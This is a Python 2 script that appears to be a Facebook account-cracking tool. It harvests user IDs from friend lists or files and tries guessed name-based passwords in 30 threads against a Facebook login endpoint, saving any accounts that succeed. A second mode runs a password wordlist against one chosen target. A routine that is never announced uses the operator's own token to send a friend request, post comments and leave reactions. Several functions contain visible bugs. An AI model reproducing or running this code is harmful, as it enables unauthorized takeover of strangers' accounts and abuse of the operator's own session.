#!/usr/bin/python2
#coding=utf-8


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.46 Safari/537.36')]


def keluar():
	print "\033[0;39m[!] \x1b[0;39mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)


##### LOGO  #####
logo = """ 

\33[31;1m╭━━━━┳━╮╭╮╭━┳━━┳━╮╱╭┳━━━╮
\33[31;1m╰━━╮━┃╭╯┃┃┃╭┻┫┣┫┃╰╮┃┃╭━╮┃
\33[31;1m╱╱╭╯╭╯╰╮┃╰╯╯╱┃┃┃╭╮╰╯┃┃╱╰╯
\33[31;1m╱╭╯╭┻╮╭╯┃╭╮┃╱┃┃┃┃╰╮┃┃┃╭━╮
\33[31;1m╭╯━╰━┫┃╱┃┃┃╰┳┫┣┫┃╱┃┃┃╰┻━┃
\33[31;1m╰━━━━┻╯╱╰╯╰━┻━━┻╯╱╰━┻━━━╯
\33[31;1mZULFIQAR MAGSI
\33[31;1m03340002925
\33[38;1mLoaded....100%
\033[0;35m[\033[0;92m •• \033[0;35m] Author   : ZULFIQAR-BALOCH
\033[1;34m\033[1;41;33mヅ︻写፨丐יי一一一 ҉ ㄹㅇㄹ1 \033[0m"""
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[0;39mPlease Wait \x1b[0;39m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """

\33[31;1m╱╱╱╱╱╱╱╭╮╭━╮╭━━━╮
\33[31;1m╱╱╱╱╱╱╱┃┃┃╭╯┃╭━╮┃
\33[31;1m╭━━━┳╮╭┫┣╯╰┳┫┃╱┃┣━━┳━╮
\33[31;1m┣━━┃┃┃┃┃┣╮╭╋┫┃╱┃┃╭╮┃╭╯
\33[31;1m┃┃━━┫╰╯┃╰┫┃┃┃╰━╯┃╭╮┃┃
\33[31;1m╰━━━┻━━┻━┻╯╰┻━━╮┣╯╰┻╯
\33[31;1m╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╰╯
\33[31;1mC͎H͎A͎N͎N͎E͎L͎ ͎N͎A͎M͎E͎=͎ ͎͎͎͎ ͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎ ͎͎͎͎ ͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎͎Z★F★ C★O★D★E★R★
\33[31;1mLOADING.......
\033[0;39m[\033[0;92m •• \033[0;39m] Author   : ZF HACKER
\033[1;39m\033[1;41;39mヅ︻写፨丐יי一一一 ҉ ㄹㅇㄹ1 \033[0m
\033[0;39m~~~~~~~~~~~~~~~~~~~~~~~~~~~"""
print("\033[0;92mUsername/Password: TERA-BAAP")
print("\033[0;39m~~~~~~~~~~~~~~~~~~~~~~~~~~~")

CorrectUsername = "ZF"
CorrectPassword = "ADMANI"


loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[0;39m\x1b[0;39mUsername ➣ \x1b[0;39m ")
    if (username == CorrectUsername):
    	password = raw_input("\033[0;39m\x1b[0;39mPassword ➣ \x1b[0;39m ")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username
            loop = 'false'
        else:
            print "Wrong Password"
            os.system('python2 a')
    else:
        print "Wrong Username"
        os.system('python2 a')

###### Login ######
def masuk():
	os.system('clear')
	print logo
	print 50* "\033[0;39m─"
	toket = raw_input("\033[0;39m[\033[0;92m> \033[0;39mToken :\033[0;93m ")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		print '\033[0;39m✓\033[0;92m Login Successful'
		menu()
	except KeyError:
		print "\033[0;39m! \033[0;39mToken Invalid !"
		time.sleep(1.7)
		masuk()
		
###### BOT COMMENT #######
def bot_komen():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;39m[!] Token invalid"
		os.system('rm -rf login.txt')
	una = ('1741317224')
	kom = ('𝙷𝚊𝚕𝚕𝚘 𝙰𝚕𝚟𝚒𝚗')
	reac = ('ANGRY')
	post = ('10208284082656658')
	post2 = ('10208284082656658')
	kom2 = ('𝙷𝚊𝚕𝚕𝚘 𝙰𝚕𝚟𝚒𝚗')
	reac2 = ('ANGRY')
	requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ toket)
	requests.post('https://graph.facebook.com/'+post2+'/comments/?message=' +kom2+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac2+ '&access_token='+ toket)
	menu()
			


def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\033[0;39m[!] Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		masuk()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
		ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
		b = json.loads(ots.text)
		sub = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print"\033[0;91mToken Invalid"
		os.system('python2 a')
		time.sleep(1)
		masuk()
	except requests.exceptions.ConnectionError:
		print"\033[0;39mThere is no internet connection"
		keluar()
	os.system("clear")
	print logo
	print "   \033[0;39;40m ╔═════════════════════════════════╗"
	print "   \033[0;39;40m ║\033[0;39;40m[*] Name\033[0;39;40m: "+nama+"  	   \033[0;39;40m║"                               
	print "   \033[0;39;40m ║\033[0;39;40m[*] ID  \033[0;39;40m: "+id+"        \033[0;39;40m║"
	print "   \033[0;39;40m ║\033[0;39;40m[*] Subs\033[0;39;40m: "+sub+"                      \033[0;39;40m║"
	print "   \033[0;39;40m ╚═════════════════════════════════╝"
	print "\033[0;32;39m1. \033[0;33;39mStart Hacking"	
	print "\033[0;32;39m2. \033[0;33;39mUpdate"																														
	print "\033[0;32;39m0. \033[0;33;39mLog out"
	pilih()

def pilih():
	unikers = raw_input("\n\033[0;40m ➣➣ \033[0;39;40m")
	if unikers =="":
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="2":
		os.system('clear')
		print logo
		print " \033[0;36;39«---------------------------------»\n"
		os.system('git pull origin master')
		raw_input('\n\033[0;39m[ \033[0;39mBack \033[0;39m]')
		menu()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\033[0;39mFill in correctly"
		pilih()

def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[0;39mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		masuk()
	os.system('clear')
	print logo
	print "\x1b ╔═════════════════════════╗"
	print "\x1b ║1. Hack From Friend List ║"
	print "\x1b ║2. Fast Public Hack          ║"
	print "\x1b ║3. Hack Bruteforce           ║"
	print "\x1b ║4. Hack From File             ║"
	print "\x1b ║0. Back                               ║"
	print "\x1b ╚═════════════════════════╝"
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;31;40m➣➣ \033[1;97m")
	if peak =="":
		print "\033[1;39mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo

		jalan('\033[0;39m[•] Getting IDs \033[0;39m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])

	elif peak =="2":
		os.system('clear')
		print logo
		idt = raw_input("\033[0;39m* Enter ID : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[0;31;39m[•] Name : "+op["name"]
		except KeyError:
			print"\033[0;39m[•] ID Not Found!"
			raw_input("\n\033[0;39m[\033[0;39mBack\033[0;39m]")
			super()
		print"\033[0;39;40m[•] Getting IDs..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="3":
		os.system('clear')
		print logo
		brute()	
	elif peak =="4":
		os.system('clear')
		print logo                  
		try:
			idlist = raw_input('\033[0;39m[+] \033[0;39mEnter the file name \033[0;39m: \033[0;39m')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except IOError:
			print '\x1b[0;35;39[!] \x1b[0;35;39File not found'
			raw_input('\n\x1b[0;35;39[ \x1b[0;35;39Exit \x1b[0;35;39]')
			super()
	elif peak =="0":
		menu()
	else:
		print "\033[0;39mFill in correctly"
		pilih_super()

	
	print "\033[0;39;40m[•] Total IDs : \033[0;97m"+str(len(id))
	jalan('\033[0;39;40m[•] Please Wait...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[0;39;40m[•] Cloning\033[0;97m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[0;39m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	print "\033[0;39m Wait Cracking Is Pending"
	print "\033[0;39m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"

	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass 
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name'] + b['last_name']
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\033[0;92m[OK] \033[0;39m ' + user  + ' \033[0;39m | \033[0;39m ' + pass1 + '\033[0;39m | \033[0;39m' + b['name']
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[0;36;39[CP] \033[0;39m ' + user  + ' \x1b[0;36;39|\033[0;39m ' + pass1 + '\033[0;39m | \033[0;39m' + b['name']
					cek = open("out/CP.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name'] + 'freefireking'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\033[0;91m[OK] \033[0;39m ' + user  + ' \033[0;39m | \033[0;39m ' + pass2 + '\033[0;39m | \033[0;39m' + b['name']
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[0;36;39[CP] \033[0;39m ' + user  + ' \x1b[0;36;39|\033[0;39m ' + pass2 + '\033[0;39m | \033[0;39m' + b['name']
							cek = open("out/CP.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] + '12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\033[0;92m[OK] \033[0;39m ' + user  + ' \033[0;39m | \033[0;39m ' + pass3 + '\033[0;39m | \033[0;39m' + b['name']
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[0;91;39[CP] \033[0;39m ' + user  + ' \x1b[0;36;39|\033[0;39m ' + pass3 + '\033[0;39m | \033[0;39m' + b['name']
									cek = open("out/CP.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass4)
								else:
									pass4 = b['first_name'] + b['last_name123']
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\033[0;92m[OK] \033[0;39m ' + user  + ' \033[0;39m | \033[0;39m ' + pass4 + '\033[0;39m | \033[0;39m' + b['name']
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[0;91;39[CP] \033[0;39m ' + user  + ' \x1b[0;36;39|\033[0;39m ' + pass4 + '\033[0;39m | \033[0;39m' + b['name']
											cek = open("out/CP.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = b['first_name'] + '123'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\033[0;92m[OK] \033[0;39m ' + user  + ' \x1b[0;36;39|\033[0;39m ' + pass5 + '\033[0;39m | \033[0;39m' + b['name']
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[0;91;39[CP] \033[0;39m ' + user  + ' \x1b[0;36;39|\033[0;39m ' + pass5 + '\033[0;39m | \033[0;39m' + b['name']
													cek = open("out/CP.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = b['last_name'] + '123'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\033[0;92m[OK] \033[0;39m ' + user  + ' \x1b[0;36;39|\033[0;39m ' + pass6 + '\033[0;39m | \033[0;39m' + b['name']
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[0;91;39[CP] \033[0;39m ' + user  + ' \x1b[0;36;39|\033[0;39m ' + pass6 + '\033[0;39m | \033[0;39m' + b['name']
															cek = open("out/CP.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = b['first_name'] + 'freefirelover'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\033[0;92m[OK] \033[0;39m ' + user  + ' \x1b[0;36;39|\033[0;39m ' + pass7 + '\033[0;39m | \033[0;39m' + b['name']
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[0;91;39[CP] \033[0;39m ' + user  + ' \x1b[0;36;39|\033[0;39m ' + pass7 + '\033[0;39m | \033[0;39m' + b['name']
																	cek = open("out/CP.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																else:
																	pass8 = b['last_name'] + '12345'
																	data = urllib.urlopen("https://b-api.facebook.com/methode/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f522ef6")
																	q = json.load(data)
																	if 'access_token' in q:
																		print '\033[0;92m[OK] \033[0;39m '+ user + ' \x1b[0;36;39|\033[0;39m ' + pass8 + '\033[0;39m | \033[0;39m' + b['name']
																		oks.append(user+pass8)
																	else:
																		if 'www.facebook.com' in q["error_msg"]:
																			print '\x1b[0;91;39[CP] \033[0;39m ' + user + '\x1b[0;36;39|\033[0;39m ' + pass8 + '\033[0;39m | \033[0;39m' + b['name']
																			cek = open("out/CP.txt", "a")
																			cek.close()
																			cekpoint.append(user+pass8)
																	
		except:																		
			pass
		
	p = ThreadPool(30)
	p.map(main, id) 
	
	print '\033[0;39;40m[•] Process Has Been Completed\033[0;39m....'
	print "\033[0;39;40m[+] Total OK/\033[0;97mCP \033[0;39m: \033[0;39m"+str(len(oks))+"\033[0;39;40m/\033[0;39;40m"+str(len(cekpoint))
	print '\033[0;39;40m[+] CP File Has Been Saved : save/cp.txt'
	print """
\033[0;30;39───────────────────────────────────────────
           """
	raw_input("\n\033[0;39m[\033[0;39mExit\033[0;39m]")
	os.system('python2 a')

def brute():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\033[0;39m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.5)
        masuk()
    else:
        os.system('clear')
        print logo
        print '\033[0;30;39 ~~~~~~~~~~~~~~~~~~~~~~~~~~~'
        try:
            email = raw_input('\033[0;39m[+] \033[0;39mID\033[0;39m/\033[0;39mEmail \033[0;39mTarget \033[0;39m:\033[0;39m ')
            passw = raw_input('\033[0;39m[+] \033[0;39mWordlist \033[0;39mext(list.txt) \033[0;39m: \033[0;39m')
            total = open(passw, 'r')
            total = total.readlines()
            print '\033[0;30;39 ~~~~~~~~~~~~~~~~~~~~~~~~~~~'
            print '\033[0;39m[\033[0;39m\xe2\x9c\x93\033[0;39m] \033[0;39mTarget \033[0;39m:\033[0;39m ' + email
            print '\033[0;39m[+] \033[0;39mTotal\033[0;39m ' + str(len(total)) + ' \033[0;39mPassword'
            jalan('\033[0;39m[\xe2\x9c\xba] \033[0;39mPlease wait \033[0;39m...')
            sandi = open(passw, 'r')
            for pw in sandi:
                try:
                    pw = pw.replace('\n', '')
                    sys.stdout.write('\r\033[0;39m[\033[0;39m\xe2\x9c\xb8\033[0;39m] \033[0;39mTry \033[0;39m' + pw)
                    sys.stdout.flush()
                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    mpsh = json.loads(data.text)
                    if 'access_token' in mpsh:
                        dapat = open('Brute.txt', 'w')
                        dapat.write(email + ' | ' + pw + '\n')
                        dapat.close()
                        print '\n\033[0;39m[+] \033[0;39mFounded.'
                        print 52 * '\033[0;39m\xe2\x95\x90'
                        print '\033[0;39m[\xe2\x9e\xb9] \033[0;39mUsername \033[0;39m:\033[0;39m ' + email
                        print '\033[0;39m[\xe2\x9e\xb9] \033[0;39mPassword \033[0;39m:\033[0;39m ' + pw
                        keluar()
                    else:
                        if 'www.facebook.com' in mpsh['error_msg']:
                            ceks = open('Brutecekpoint.txt', 'w')
                            ceks.write(email + ' | ' + pw + '\n')
                            ceks.close()
                            print '\n\033[0;39m[+] \033[0;39mFounded.'
                            print  "\033[0;36;39 ~~~~~~~~~~~~~~~~~~~~~~~~~~~"
                            print '\033[0;39m[!] \033[0;39mAccount Maybe Checkpoint'
                            print '\033[0;39m[\xe2\x9e\xb9] \033[0;39mUsername \033[0;39m:\033[0;39m ' + email
                            print '\033[0;39m[\xe2\x9e\xb9] \033[0;39mPassword \033[0;39m:\033[0;39m ' + pw
                            keluar()
                except requests.exceptions.ConnectionError:
                    print '\033[0;39m[!] Connection Error'
                    time.sleep(1)

        except IOError:
            print '\033[0;39m[!] File not found...'
            print """\n\033[0;39m[!] \033[0;39mLooks like you don't have a wordlist"""
            super()

if __name__ == '__main__':
	masuk()
